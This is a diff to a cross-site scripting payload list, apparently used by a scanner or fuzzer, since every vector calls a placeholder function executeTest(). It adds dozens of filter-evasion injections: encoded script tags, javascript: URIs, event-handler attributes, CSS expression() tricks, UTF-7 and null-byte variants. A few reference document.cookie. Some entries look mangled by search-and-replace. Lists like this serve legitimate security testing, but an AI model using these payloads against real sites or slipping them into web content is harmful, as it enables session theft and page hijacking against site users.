@@ -1,4 +1,7 @@
 <script>executeTest()</script>
+<script><!--a-->executeTest()</script>
+@lt;script@gt;executeTest()@lt;/script@gt;
+@lt;script@gt;@lt;!--a--@gt;executeTest()@lt;/script@gt;
 ><script>executeTest()</script>
 "><script>executeTest()</script>
 '><script>executeTest()</script>
@@ -9,6 +12,16 @@
 "});executeTest()</script>
 "}));executeTest()</script>
 "})));executeTest()</script>
+@gt;@lt;script@gt;executeTest()@lt;/script@gt;
+&quot;@gt;@lt;script@gt;executeTest()@lt;/script@gt;
+&&#035;039;@gt;@lt;script@gt;executeTest()@lt;/script@gt;
+&&#035;039;;executeTest()@lt;/script@gt;
+&quot;;executeTest()@lt;/script@gt;
+&quot;&&#035;039;;executeTest()@lt;/script@gt;
+&&#035;039;&quot;;executeTest()@lt;/script@gt;
+&quot;});executeTest()@lt;/script@gt;
+&quot;}));executeTest()@lt;/script@gt;
+&quot;})));executeTest()@lt;/script@gt;
 <img src=executeTest() onerror=executeTest()>
 ><img src=executeTest() onerror=executeTest()>
 <a href="javascript:executeTest()">
@@ -32,29 +45,30 @@
 \";executeTest();//
 %3cscript%3EexecuteTest();%3c/script%3e
 %3cscript%3EexecuteTest();%3c%2fscript%3e
-%3Cscript%3Ealert(%22X SS%22);%3C/script%3E
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
 &ltscript&gtalert(executeTest());</script>
 &ltscript&gtalert(executeTest());&ltscript&gtalert
 <xss><script>executeTest()</script></vulnerable>
-<IMG SRC='javascript:executeTest()'>
-<IMG SRC="javascript:executeTest();">
-<IMG SRC="javascript:executeTest()"
-<IMG SRC=javascript:executeTest()>
-<IMG SRC=JaVaScRiPt:executeTest()>
-<IMG SRC=javascript:executeTest()>
-<IMG SRC=`javascript:executeTest()`>
-<IMG """><SCRIPT>executeTest()</SCRIPT>">
-<IMG SRC=javascript:executeTest()>
-<IMG SRC='javasc	ript:executeTest();'>
-<IMG SRC="jav	ascript:executeTest();">
-<IMG SRC="jav&#x09;ascript:executeTest();">
-<IMG SRC="jav&#x0A;ascript:executeTest();">
-<IMG SRC="jav&#x0D;ascript:executeTest();">
-<IMG SRC=" &#14; javascript:executeTest();">
-<IMG DYNSRC="javascript:executeTest()">
-<IMG LOWSRC="javascript:executeTest()">
-<IMG SRC='%26%23x6a;avasc%26%23000010ript:executeTest();'>
-'%3CIFRAME SRC=javascript:executeTest();%3E%3C/IFRAME%3E
+<IMG%20SRC='javascript:executeTest()'>
+&lt;IMG%20SRC=jAVasCrIPt:executeTest()&gt;
+<IMG%20SRC="javascript:executeTest();">
+<IMG%20SRC="javascript:executeTest()"
+<IMG%20SRC=javascript:executeTest()>
+<IMG%20SRC=JaVaScRiPt:executeTest()>
+<IMG%20SRC=javascript:executeTest()>
+<IMG%20SRC=`javascript:executeTest()`>
+<IMG%20"""><SCRIPT>executeTest()</SCRIPT>">
+<IMG%20SRC=javascript:executeTest()>
+<IMG%20SRC='javasc	ript:executeTest();'>
+<IMG%20SRC="jav	ascript:executeTest();">
+<IMG%20SRC="jav&#x09;ascript:executeTest();">
+<IMG%20SRC="jav&#x0A;ascript:executeTest();">
+<IMG%20SRC="jav&#x0D;ascript:executeTest();">
+<IMG%20SRC="%20&#14;%20javascript:executeTest();">
+<IMG%20DYNSRC="javascript:executeTest()">
+<IMG%20LOWSRC="javascript:executeTest()">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:executeTest();'>
+'%3CIFRAME%20SRC=javascript:executeTest();%3E%3C/IFRAME%3E
 "><script>executeTest()</script>
 %22%3E%3Cscript%3EexecuteTest()%2Fscript%3E
 ';executeTest()//\';executeTest()//
@@ -62,3 +76,130 @@
 executeTest())//>
 </SCRIPT>!--<SCRIPT>executeTest()</SCRIPT>=&{}
 '';!--"executeTest()=&{()}
+<ScRipT>executeTest()</ScRipT>
+<script>executeTest();</script>
+</script><script>executeTest()</script>
+‘; executeTest();
+‘)executeTest();//
+<ScRiPt>executeTest()</sCriPt>
+<IMG SRC=jAVasCrIPt:executeTest()>
+<IMG SRC=”javascript:executeTest();”>
+<IMG SRC=javascript:executeTest()>
+<IMG SRC=javascript:executeTest()>
+<img src=xss onerror=executeTest()>
+<iframe %00 src="&Tab;javascript:executeTest()&Tab;"%00>
+<sVg><scRipt %00>executeTest()&lpar;1&rpar; {Opera}
+<img src=`%00`&NewLine; onerror=executeTest()&NewLine;
+<ScRipT 5-0*3+9/3=>executeTest()</ScRipT giveanswerhere=?
+<script /*%00*/>/*%00*/executeTest()/*%00*/</script /*%00*/
+&#34;&#62;<h1/onmouseover='\u00executeTest()'>%00
+<iframe/src="data:text/html,<svg &#111;&#110;load=executeTest()>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; executeTest()" http-equiv="refresh"/>
+<svg><script xlink:href=data&colon;,executeTest()></script
+<meta http-equiv="refresh" content="0;url=javascript:executeTest()">
+<iframe src=javascript&colon;executeTest()&lpar;document&period;location&rpar;>
+<form><a href="javascript:\u00executeTest&#x28#x29;">X
+</script><img/*%00/src="worksinchrome&colon;executeTest&#x28#x29;"/%00*/onerror='eval(src)'>
+<img/&#09;&#10;&#11; src=`~` onerror=executeTest()>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;executeTest()"&#11;&#10;&#09;;>
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<img/src=@&#32;&#13; onerror = executeTest()
+<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+<script ^__^>executeTest()</script ^__^
+</style &#32;><script &#32; :-(>/**/executeTest()/**/</script &#32; :-(
+&#00;</form><input type&#61;"date" onfocus="executeTest()">
+<form><textarea &#13; onkeyup='\u0061\u006C\u0065\u0072\u0074&#x28;1&#x29;'>
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+<iframe srcdoc='&lt;body onload=executeTest&lpar;&rpar;&gt;'>
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:executeTest()&NewLine;>X</a>
+<script ~~~>executeTest()</script ~~~>
+<style/onload=&lt;!--&#09;&gt;&#10;executeTest&#10;&lpar;&rpar;>
+<///style///><span %2F onmousemove='executeTest&lpar;&rpar;'>SPAN
+<img/src='http://i.imgur.com/P8mL8.jpg' onmouseover=&Tab;executeTest()
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=executeTest()>'
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<marquee onstart='javascript:executeTest&#x28;&#x29;'>^__^
+<div/style="width:expression(executeTest())">X</div> {IE7}
+<iframe/%00/ src=javaSCRIPT&colon;executeTest()
+//<form/action=javascript&#x3A;executeTest&lpar;document&period;cookie&rpar;><input/type='submit'>//
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=executeTest() /*iframe/src*/>
+`<img src=a onerror=\"executeTest()\">`
+"}]}';executeTest()</script>
+<img src=x onerror=executeTest()>
+<IMG """><SCRIPT>executeTest()</SCRIPT>"\>
+<IMG SRC=# onmouseover="executeTest()">
+<IMG SRC=# onmouseover=executeTest()>
+<IMG SRC=/ onerror="executeTest()"></img>
+<IMG SRC=/ onerror=executeTest()></img>
+<IMG SRC="jav	ascript:executeTest();">
+<IMG SRC="jav&#x09;ascript:executeTest();">
+<IMG SRC="jav&#x0A;ascript:executeTest();">
+<IMG SRC="jav&#x0D;ascript:executeTest();">
+perl -e 'print "<IMG SRC=java\0script:executeTest()>";' > out
+<IMG SRC=" &#14;  javascript:executeTest();">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=executeTest()>
+'">><marquee><img src=x onerror=executeTest()></marquee>"></plaintext\></|\><plaintext/onmouseover=executeTest()>
+<<SCRIPT>executeTest();//\<</SCRIPT>
+<IMG SRC="`<javascript:executeTest>`()"
+\";executeTest();//
+</TITLE><SCRIPT>executeTest();</SCRIPT>
+<BODY BACKGROUND="javascript:executeTest()">
+<IMG DYNSRC="javascript:executeTest()">
+<IMG LOWSRC="javascript:executeTest()">
+<STYLE>li {list-style-image: url("javascript:executeTest()");}</STYLE><UL><LI>XSS</br>
+<svg/onload=executeTest()>
+<BODY ONLOAD=executeTest()>
+<BGSOUND SRC="javascript:executeTest();">
+<BR SIZE="&{executeTest()}">
+<LINK REL="stylesheet" HREF="javascript:executeTest();">
+<STYLE>@im\port'\ja\vasc\ript:executeTest()';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(executeTest())">
+exp/*<A STYLE='no\xss:noxss("*//*");
+xss:ex/*XSS*//*/*/pression(executeTest())'>
+<STYLE TYPE="text/javascript">executeTest();</STYLE>
+<STYLE>.XSS{background-image:url("javascript:executeTest()");}</STYLE><A
+CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:executeTest()")}</STYLE>
+<STYLE type="text/css">BODY{background:url("<javascript:executeTest>()")}</STYLE>
+<XSS STYLE="xss:expression(executeTest>())">
+¼script¾executeTest()¼/script¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:executeTest();">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:executeTest();">
+<IFRAME SRC="javascript:executeTest();"></IFRAME>
+<IFRAME SRC=# onmouseover="executeTest()"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:executeTest();"></FRAMESET>
+<TABLE BACKGROUND="javascript:executeTest()">
+<TABLE><TD BACKGROUND="javascript:executeTest()">
+<DIV STYLE="background-image: url(javascript:executeTest())">
+<DIV STYLE="background-image: url(javascript:executeTest())">
+<DIV STYLE="width: expression(executeTest());">
+<!--[if gte IE 4]><SCRIPT>executeTest();</SCRIPT><![endif]-->
+<BASE HREF="javascript:executeTest();//">
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:executeTest()"></B></I></XML>
+<? echo('<SCR)';echo('IPT>executeTest()</SCRIPT>'); ?>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>executeTest()</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-executeTest();+ADw-/SCRIPT+AD4-
+<Img src = x onerror = "javascript: window.onerror = executeTest; throw XSS">
+<Video> <source onerror = "javascript: executeTest()">
+<applet code="javascript:executeTest();">
+<isindex x="javascript:" onmouseover="executeTest()">
+"></SCRIPT>”>’><SCRIPT>executeTest())</SCRIPT>
+"><img src="x:x" onerror="executeTest()">
+"><iframe src="javascript:executeTest()">
+<object data="javascript:executeTest()">
+<isindex type=image src=1 onerror=executeTest()>
+<img src=x:executeTest(alt) onerror=eval(src) alt=0>
+<iframe/src="data:text/html,<svg onload=executeTest()>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; executeTest()" http-equiv="refresh"/>
+<meta http-equiv="refresh" content="0;url=javascript:executeTest()">
+<iframe src=javascript&colon;executeTest&lpar;document&period;location&rpar;>
+</script><img/*%00/src="worksinchrome&colon;executeTest()"/%00*/onerror='eval(src)'>
+<style>//*{x:expression(executeTest())}//<style></style>
+On Mouse Over​ <img src="/" =_=" title="onerror='executeTest()'">
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&&#232xecuteTest();>ClickMe
+<script x> executeTest() </script 1=2
+<form><button formaction=javascript&colon;executeTest()>CLICKME
+<input/onmouseover="javaSCRIPT&colon;executeTest&lpar;1&rpar;"
+<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
+<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:executeTest()"></OBJECT>
